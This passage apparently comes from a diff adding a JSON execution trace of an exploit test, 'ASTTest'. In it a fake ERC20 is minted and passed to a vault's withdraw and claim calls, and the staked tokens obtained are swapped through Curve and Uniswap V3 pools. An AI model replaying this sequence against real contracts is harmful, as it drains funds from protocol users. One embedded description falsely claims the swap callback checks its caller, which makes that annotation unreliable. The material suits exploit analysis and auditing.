+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 39165842900855519099 [3.916e19]",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "2473",
+                        "contract": "0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46",
+                        "function": "getUint",
+                        "value": null,
+                        "args": "0xdb6154e130fa18e576b7f99ad2cf6c1643834245426facf16cc68c0b21ecf3ef",
+                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "9726",
+            "contract": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+            "function": "balanceOf",
+            "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "flag": 1,
+            "return_value": "20000407064566313222 [2e19]",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "2529",
+                "contract": "0x31724cA0C982A31fbb5C57f4217AB585271fc9a5",
+                "function": "balanceOf",
+                "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                "flag": 1,
+                "return_value": "20000407064566313222 [2e19]",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "602106",
+            "contract": "→ new MyERC20@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a",
+            "function": "constructor",
+            "args": "",
+            "return_value": "2782 bytes of code",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "47107",
+            "contract": "MyERC20",
+            "function": "mint",
+            "args": "10000000000000000000000 [1e22]",
+            "flag": 1,
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "25056",
+            "contract": "MyERC20",
+            "function": "approve",
+            "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "487770",
+            "contract": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "function": "withdraw",
+            "args": "MyERC20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 20000407064566313222 [2e19]",
+            "flag": 1,
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "487241",
+                "contract": "0x4D5B4B9Ccf52bBcFE7B71b3038D8577293779E0C",
+                "function": "withdraw",
+                "args": "MyERC20: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 20000407064566313222 [2e19]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "847",
+                    "contract": "MyERC20",
+                    "function": "balanceOf",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+                    "flag": 1,
+                    "return_value": "10000000000000000000000 [1e22]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "1147",
+                    "contract": "MyERC20",
+                    "function": "allowance",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "685",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "26555",
+                    "contract": "MyERC20",
+                    "function": "transferFrom",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 20000407064566313222 [2e19]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "685",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "0",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "654",
+                    "contract": "MyERC20",
+                    "function": "stakedTokenAddress",
+                    "args": "",
+                    "flag": 1,
+                    "return_value": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "716",
+                    "contract": "MyERC20",
+                    "function": "scaledBalanceToBalance",
+                    "args": "0",
+                    "flag": 1,
+                    "return_value": "20000407064566313222 [2e19]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "1226",
+                    "contract": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+                    "function": "balanceOf",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                    "flag": 1,
+                    "return_value": "20000407064566313222 [2e19]",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "529",
+                        "contract": "0x31724cA0C982A31fbb5C57f4217AB585271fc9a5",
+                        "function": "balanceOf",
+                        "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+                        "flag": 1,
+                        "return_value": "20000407064566313222 [2e19]",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "3505",
+                    "contract": "MyERC20",
+                    "function": "burn",
+                    "args": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70, 20000407064566313222 [2e19]",
+                    "flag": 1,
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "87907",
+            "contract": "0xbAa87546cF87b5De1b0b52353A86792D40b8BA70",
+            "function": "claim",
+            "args": "2",
+            "flag": 1,
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "87381",
+                "contract": "0x4D5B4B9Ccf52bBcFE7B71b3038D8577293779E0C",
+                "function": "claim",
+                "args": "2",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "654",
+                    "contract": "MyERC20",
+                    "function": "stakedTokenAddress",
+                    "args": "",
+                    "flag": 1,
+                    "return_value": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "35383",
+                    "contract": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+                    "function": "transfer",
+                    "value": null,
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20000407064566313222 [2e19]",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "34683",
+                        "contract": "0x31724cA0C982A31fbb5C57f4217AB585271fc9a5",
+                        "function": "transfer",
+                        "value": null,
+                        "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20000407064566313222 [2e19]",
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "id": "28142",
+            "contract": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+            "function": "approve",
+            "args": "0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, 64176037513415148812 [6.417e19]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "1763",
+                "contract": "0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc",
+                "function": "getApp",
+                "value": null,
+                "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "820",
+                    "contract": "0x2b33CF282f867A7FF693A66e11B0FcC5552e4425",
+                    "function": "getApp",
+                    "value": null,
+                    "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                    "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "24756",
+                "contract": "0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb",
+                "function": "approve",
+                "args": "0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, 64176037513415148812 [6.417e19]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "90944",
+            "contract": "0xDC24316b9AE028F1497c275EB9192a3Ea0f67022",
+            "function": "exchange",
+            "value": null,
+            "args": "1, 0, 64176037513415148812 [6.417e19], 0",
+            "return_value": "0x0000000000000000000000000000000000000000000000037a61abf60ec83d7f",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "8468",
+                "contract": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+                "function": "balanceOf",
+                "args": "0xDC24316b9AE028F1497c275EB9192a3Ea0f67022",
+                "flag": 1,
+                "return_value": "60498577684550166430717 [6.049e22]",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "1763",
+                    "contract": "0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc",
+                    "function": "getApp",
+                    "value": null,
+                    "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                    "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "820",
+                        "contract": "0x2b33CF282f867A7FF693A66e11B0FcC5552e4425",
+                        "function": "getApp",
+                        "value": null,
+                        "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                        "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "5088",
+                    "contract": "0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb",
+                    "function": "balanceOf",
+                    "args": "0xDC24316b9AE028F1497c275EB9192a3Ea0f67022",
+                    "flag": 1,
+                    "return_value": "60498577684550166430717 [6.049e22]",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "17209",
+                "contract": "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
+                "function": "transferFrom",
+                "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, 64176037513415148812 [6.417e19]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "1763",
+                    "contract": "0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc",
+                    "function": "getApp",
+                    "value": null,
+                    "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                    "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "820",
+                        "contract": "0x2b33CF282f867A7FF693A66e11B0FcC5552e4425",
+                        "function": "getApp",
+                        "value": null,
+                        "args": "0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320",
+                        "return_value": "0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "13817",
+                    "contract": "0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb",
+                    "function": "transferFrom",
+                    "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, 64176037513415148812 [6.417e19]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "18",
+                "contract": "PRECOMPILES",
+                "function": "identity",
+                "value": null,
+                "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "55",
+                "contract": "ASTTest",
+                "function": "receive",
+                "value": "value: 64158750839795105151",
+                "args": "",
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "24538",
+            "contract": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+            "function": "approve",
+            "args": "0xa4e0faA58465A2D369aa21B3e42d43374c6F9613, 39165842900855519099 [3.916e19]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "118938",
+            "contract": "0xa4e0faA58465A2D369aa21B3e42d43374c6F9613",
+            "function": "swap",
+            "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 39165842900855519099 [3.916e19], 4295128740 [4.295e9], 0x",
+            "original_code": "    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external override noDelegateCall returns (int256 amount0, int256 amount1) {\n        require(amountSpecified != 0, 'AS');\n\n        Slot0 memory slot0Start = slot0;\n\n        require(slot0Start.unlocked, 'LOK');\n        require(\n            zeroForOne\n                ? sqrtPriceLimitX96 < slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO\n                : sqrtPriceLimitX96 > slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 < TickMath.MAX_SQRT_RATIO,\n            'SPL'\n        );\n\n        slot0.unlocked = false;\n\n        SwapCache memory cache =\n            SwapCache({\n                liquidityStart: liquidity,\n                blockTimestamp: _blockTimestamp(),\n                feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol >> 4),\n                secondsPerLiquidityCumulativeX128: 0,\n                tickCumulative: 0,\n                computedLatestObservation: false\n            });\n\n        bool exactInput = amountSpecified > 0;\n\n        SwapState memory state =\n            SwapState({\n                amountSpecifiedRemaining: amountSpecified,\n                amountCalculated: 0,\n                sqrtPriceX96: slot0Start.sqrtPriceX96,\n                tick: slot0Start.tick,\n                feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,\n                protocolFee: 0,\n                liquidity: cache.liquidityStart\n            });\n\n        // continue swapping as long as we haven't used the entire input/output and haven't reached the price limit\n        while (state.amountSpecifiedRemaining != 0 && state.sqrtPriceX96 != sqrtPriceLimitX96) {\n            StepComputations memory step;\n\n            step.sqrtPriceStartX96 = state.sqrtPriceX96;\n\n            (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n                state.tick,\n                tickSpacing,\n                zeroForOne\n            );\n\n            // ensure that we do not overshoot the min/max tick, as the tick bitmap is not aware of these bounds\n            if (step.tickNext < TickMath.MIN_TICK) {\n                step.tickNext = TickMath.MIN_TICK;\n            } else if (step.tickNext > TickMath.MAX_TICK) {\n                step.tickNext = TickMath.MAX_TICK;\n            }\n\n            // get the price for the next tick\n            step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);\n\n            // compute values to swap to the target tick, price limit, or point where input/output amount is exhausted\n            (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(\n                state.sqrtPriceX96,\n                (zeroForOne ? step.sqrtPriceNextX96 < sqrtPriceLimitX96 : step.sqrtPriceNextX96 > sqrtPriceLimitX96)\n                    ? sqrtPriceLimitX96\n                    : step.sqrtPriceNextX96,\n                state.liquidity,\n                state.amountSpecifiedRemaining,\n                fee\n            );\n\n            if (exactInput) {\n                state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();\n                state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());\n            } else {\n                state.amountSpecifiedRemaining += step.amountOut.toInt256();\n                state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());\n            }\n\n            // if the protocol fee is on, calculate how much is owed, decrement feeAmount, and increment protocolFee\n            if (cache.feeProtocol > 0) {\n                uint256 delta = step.feeAmount / cache.feeProtocol;\n                step.feeAmount -= delta;\n                state.protocolFee += uint128(delta);\n            }\n\n            // update global fee tracker\n            if (state.liquidity > 0)\n                state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);\n\n            // shift tick if we reached the next price\n            if (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n                // if the tick is initialized, run the tick transition\n                if (step.initialized) {\n                    // check for the placeholder value, which we replace with the actual value the first time the swap\n                    // crosses an initialized tick\n                    if (!cache.computedLatestObservation) {\n                        (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(\n                            cache.blockTimestamp,\n                            0,\n                            slot0Start.tick,\n                            slot0Start.observationIndex,\n                            cache.liquidityStart,\n                            slot0Start.observationCardinality\n                        );\n                        cache.computedLatestObservation = true;\n                    }\n                    int128 liquidityNet =\n                        ticks.cross(\n                            step.tickNext,\n                            (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),\n                            (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),\n                            cache.secondsPerLiquidityCumulativeX128,\n                            cache.tickCumulative,\n                            cache.blockTimestamp\n                        );\n                    // if we're moving leftward, we interpret liquidityNet as the opposite sign\n                    // safe because liquidityNet cannot be type(int128).min\n                    if (zeroForOne) liquidityNet = -liquidityNet;\n\n                    state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);\n                }\n\n                state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n            } else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) {\n                // recompute unless we're on a lower tick boundary (i.e. already transitioned ticks), and haven't moved\n                state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);\n            }\n        }\n\n        // update tick and write an oracle entry if the tick change\n        if (state.tick != slot0Start.tick) {\n            (uint16 observationIndex, uint16 observationCardinality) =\n                observations.write(\n                    slot0Start.observationIndex,\n                    cache.blockTimestamp,\n                    slot0Start.tick,\n                    cache.liquidityStart,\n                    slot0Start.observationCardinality,\n                    slot0Start.observationCardinalityNext\n                );\n            (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (\n                state.sqrtPriceX96,\n                state.tick,\n                observationIndex,\n                observationCardinality\n            );\n        } else {\n            // otherwise just update the price\n            slot0.sqrtPriceX96 = state.sqrtPriceX96;\n        }\n\n        // update liquidity if it changed\n        if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;\n\n        // update fee growth global and, if necessary, protocol fees\n        // overflow is acceptable, protocol has to withdraw before it hits type(uint128).max fees\n        if (zeroForOne) {\n            feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token0 += state.protocolFee;\n        } else {\n            feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token1 += state.protocolFee;\n        }\n\n        (amount0, amount1) = zeroForOne == exactInput\n            ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)\n            : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);\n\n        // do the transfers and collect payment\n        if (zeroForOne) {\n            if (amount1 < 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n\n            uint256 balance0Before = balance0();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance0Before.add(uint256(amount0)) <= balance0(), 'IIA');\n        } else {\n            if (amount0 < 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n\n            uint256 balance1Before = balance1();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance1Before.add(uint256(amount1)) <= balance1(), 'IIA');\n        }\n\n        emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);\n        slot0.unlocked = true;\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
+            "description": "1. **Core functions**:  \n   The `swap` function is designed to facilitate a token swap within a decentralized exchange (DEX) pool. It allows users to exchange one token for another based on the specified parameters, such as the direction of the swap (which token to swap for which), the amount to swap, and the price limit. The function ensures that the swap is executed correctly by updating the pool's state, including the current price, liquidity, and fees. It also handles the transfer of tokens between the user and the pool.\n\n2. **Security mechanism**:  \n   - **`noDelegateCall` modifier**: Prevents the function from being called through a delegate call, ensuring it runs in the intended context.  \n   - **`require` statements**: These checks ensure conditions like the swap amount being non-zero, the pool being unlocked, and the price limit being valid.  \n   - **Locking mechanism**: The pool is locked (`slot0.unlocked = false`) during the swap to prevent reentrancy attacks and ensure atomicity.  \n   - **Balance checks**: After the swap, the function verifies that the pool's token balances have increased correctly to prevent manipulation.  \n\n3. **Parameter Function**:  \n   - **`recipient`**: The address that will receive the swapped tokens.  \n   - **`zeroForOne`**: A boolean indicating the direction of the swap (e.g., `true` for swapping token0 for token1).  \n   - **`amountSpecified`**: The amount of tokens the user wants to swap, with a positive value for input and negative for output.  \n   - **`sqrtPriceLimitX96`**: The price limit for the swap, ensuring the swap doesn’t execute beyond a certain price point.  \n   - **`data`**: Additional data passed to the callback function, typically used for custom logic during the swap.  \n\n4. **Return description**:  \n   The function returns two values: `amount0` and `amount1`. These represent the amounts of token0 and token1 involved in the swap. The calculation depends on the swap direction (`zeroForOne`) and whether the swap is an exact input or output. The function adjusts these amounts based on the remaining swap amount and the calculated swap steps, ensuring the correct token amounts are transferred.  \n\n**In summary**, the `swap` function enables token swaps in a DEX pool while ensuring security through checks, locking mechanisms, and balance verification. It processes the swap based on user-specified parameters and returns the amounts of tokens involved in the transaction.",
+            "return_value": "0x0000000000000000000000000000000000000000000000021f89069bda3f777bfffffffffffffffffffffffffffffffffffffffffffffffdb08e157837cf1cbc",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "29962",
+                "contract": "wETH",
+                "function": "transfer",
+                "value": null,
+                "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 42618102617683845956 [4.261e19]",
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "2486",
+                "contract": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+                "function": "balanceOf",
+                "args": "0xa4e0faA58465A2D369aa21B3e42d43374c6F9613",
+                "flag": 1,
+                "return_value": "832491155680765121905 [8.324e20]",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "11945",
+                "contract": "ASTTest",
+                "function": "uniswapV3SwapCallback",
+                "args": "39165842900855519099 [3.916e19], -42618102617683845956 [-4.261e19], 0x",
+                "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            IERC20(IuniswapV3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));\n        } else if (amount1Delta > 0) {\n            IERC20(IuniswapV3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));\n        }\n",
+                "description": "1. Core functions:  \nThis function is a callback used in Uniswap V3 swaps. Its main role is to handle the transfer of tokens during a swap. When a swap occurs, this function is triggered to send the required tokens from the user to the Uniswap pool. It checks which token needs to be transferred (either `token0` or `token1`) based on the swap details and then performs the transfer.\n\n2. Security mechanism:  \nThe function uses the `external` modifier, which means it can only be called from outside the contract, ensuring it is only triggered by the Uniswap protocol. Additionally, it verifies the sender (`msg.sender`) to ensure the request comes from a valid Uniswap pool. The function also checks the values of `amount0Delta` and `amount1Delta` to determine which token to transfer, preventing unnecessary or incorrect transfers.\n\n3. Parameter Function:  \n- `amount0Delta`: Represents the amount of `token0` that needs to be transferred. If this value is positive, it indicates that `token0` is required for the swap.  \n- `amount1Delta`: Represents the amount of `token1` that needs to be transferred. If this value is positive, it indicates that `token1` is required for the swap.  \n- `data`: Additional data passed to the function, which is not used in this specific implementation but can be useful for more complex operations.  \n\n4. Return description:  \nThis function does not return any value. Instead, it performs a transfer of tokens based on the values of `amount0Delta` and `amount1Delta`. If `amount0Delta` is positive, it transfers `token0` to the sender (Uniswap pool). If `amount1Delta` is positive, it transfers `token1` to the sender.  \n\nIn summary, this function ensures that the correct tokens are transferred to the Uniswap pool during a swap, using checks and validations to maintain security and accuracy.",
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "266",
+                    "contract": "0xa4e0faA58465A2D369aa21B3e42d43374c6F9613",
+                    "function": "token0",
+                    "args": "",
+                    "original_code": "",
+                    "description": "",
+                    "return_value": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "9425",
+                    "contract": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+                    "function": "transfer",
+                    "value": null,
+                    "args": "0xa4e0faA58465A2D369aa21B3e42d43374c6F9613, 39165842900855519099 [3.916e19]",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "2473",
+                        "contract": "0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46",
+                        "function": "getUint",
+                        "value": null,
+                        "args": "0x26823a8a8810f55cd0ba19990304dbe1d99116ae953b652c926a7770c41fc679",
+                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "id": "486",
+                "contract": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+                "function": "balanceOf",
+                "args": "0xa4e0faA58465A2D369aa21B3e42d43374c6F9613",
+                "flag": 1,
+                "return_value": "871656998581620641004 [8.716e20]",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "27746",
+            "contract": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+            "function": "approve",
+            "args": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410, 20000407064566313222 [2e19]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "27078",
+                "contract": "0x31724cA0C982A31fbb5C57f4217AB585271fc9a5",
+                "function": "approve",
+                "args": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410, 20000407064566313222 [2e19]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "63359",
+            "contract": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410",
+            "function": "swap",
+            "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 20000407064566313222 [2e19], 4295128740 [4.295e9], 0x",
+            "flag": 1,
+            "return_value": "0x000000000000000000000000000000000000000000000001158fb8422eb03106fffffffffffffffffffffffffffffffffffffffffffffffedc47aa2db3ab25e9",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "8062",
+                "contract": "wETH",
+                "function": "transfer",
+                "value": null,
+                "args": "ASTTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21020645622463912471 [2.102e19]",
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "3226",
+                "contract": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+                "function": "balanceOf",
+                "args": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410",
+                "flag": 1,
+                "return_value": "338902200232840689492 [3.389e20]",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "2529",
+                    "contract": "0x31724cA0C982A31fbb5C57f4217AB585271fc9a5",
+                    "function": "balanceOf",
+                    "args": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410",
+                    "flag": 1,
+                    "return_value": "338902200232840689492 [3.389e20]",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "10003",
+                "contract": "ASTTest",
+                "function": "uniswapV3SwapCallback",
+                "args": "20000407064566313222 [2e19], -21020645622463912471 [-2.102e19], 0x",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "266",
+                    "contract": "0x840DEEef2f115Cf50DA625F7368C24af6fE74410",
+                    "function": "token0",
+                    "args": "",
+                    "flag": 1,
+                    "return_value": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "7483",
+                    "contract": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+                    "function": "transfer",
+                    "value": null,
